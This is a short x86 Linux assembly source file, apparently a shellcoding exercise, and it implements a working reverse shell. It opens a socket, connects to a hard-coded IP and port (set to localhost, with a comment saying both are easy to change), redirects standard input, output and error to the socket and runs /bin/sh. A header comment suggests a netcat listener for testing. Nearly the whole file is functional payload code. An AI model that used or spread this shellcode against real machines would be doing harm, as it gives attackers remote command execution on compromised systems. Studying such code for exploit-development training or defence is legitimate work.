; Content:	reverse_shell
; Date: 	02/2019
;
;
; For testing connect via 'nc -lvp 11013'
;
; port and targetIP can be changed easily in line 37 & 38!

section .text
global _start

_start:
	; [+] setup socket via socketcall (syscall 102) & sockfd [+]
	push 0x66		; sys_socketcall
	pop eax			; move sys_socketcall 102 into eax

	xor ebx, ebx	; Zero out ebx	
	inc ebx			; Increment ebx by 1. It is equal to 1 now.
	

	xor esi,esi		; Zero out esi

	; Currently esi=0
	push esi		; Third arguement: IPPROTO_IP	= 0 
	push ebx		; Second arguement: SOCK_STREAM	= 1 
	push byte 0x2	; First arguement: AF_INET	= 2

	mov ecx,esp	     
    
	int 0x80		; exec socket

	mov edi, eax		; save sockfd result

	; [+] connect port and IP via socketcall & connect [+]
    mov al, 0x66		; move sys_socketcall 102 into eax	
	mov bl, 0x3
	push dword 0x0100007F	; Third arguement: IP to connect (reverseHex)	
	push word 0x052B		; Second arguement: port to connect (reverseHex)
	push WORD 0x2			; First arguement: AF_INET	= 2
	mov ecx,esp       

	; [+] args for connect() [+]
	push 0x10				; addrlen 	= 0.0.0.0 (16 bits)
	push ecx                ; addr to bind struct
	push edi                ; saved socketfd status
	mov ecx,esp             	

	int 0x80                ; exec connect

	; [+] copies 3 file descriptions STDIN, STDOUT, STDERR via dup2 [+]
	mov ebx, edi            ; Move socketfd status into ebx
	xor ecx, ecx		; Zero out ecx
	mov cl,0x2		; move 2 into ecx. 2 is counter. Set up loopCounter
loop:
	mov al, 0x3f            ; move 63 into eax. 63 is dup2
	int 0x80
	dec ecx                 ; ecx - 1
	jns loop 				; jmp back to beginning of loop if it's bigger or equal to 0

	; [+] finally shell via execve [+]

	mov al, 0xB             ; move 11 into eax. 11 is execve 

	push esi                ; Third arguement: 0
	push dword 0x68732f2f   ; Second arguement: "//sh"
	push dword 0x6e69622f   ; First arguement: "/bin"
	mov ebx,esp             ; filename = "/bin//sh\x0"

	push esi
	push ebx
	mov ecx, esp            ; argv = [filename, 0] 

	mov edx, esi            ; edi = 0

	int 0x80                ; exec execve 
